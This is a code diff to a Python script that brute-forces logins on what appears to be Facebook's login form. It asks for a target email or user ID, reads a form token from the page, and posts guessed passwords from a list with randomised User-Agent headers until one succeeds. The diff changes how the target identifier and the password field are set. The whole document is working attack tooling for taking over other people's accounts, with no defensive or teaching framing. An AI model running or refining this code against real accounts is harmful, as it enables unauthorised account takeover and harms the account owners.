@@ -24,8 +24,13 @@ def create_form():
     soup = BeautifulSoup(data.text, 'html.parser')
     form = {
         'lsd': soup.form.input['value'],
-        'email': input('Enter Email/Username to target: ').strip(),
     }
+    email = input('Enter Email/Username to target: ').strip()
+    user_id = input('Enter User ID to target (leave empty if not needed): ').strip()
+    if user_id:
+        form['jazoest'] = f'{user_id}_'
+    else:
+        form['email'] = email
     return form, session
 
 def is_this_a_password(index, password, form, session):
@@ -43,6 +48,7 @@ def is_this_a_password(index, password, form, session):
     session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
 
     try:
+        form['pass'] = password
         r = session.post(POST_URL, data=form, headers=session.headers)
     except requests.exceptions.RequestException as e:
         print(f"Error occurred: {e}")
@@ -80,7 +86,6 @@ if __name__ == "__main__":
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
         print(f"Trying password [{index}]: {password}")
-        form['pass'] = password
         if is_this_a_password(index, password, form, session):
             break
         ATTEMPT_COUNTER += 1
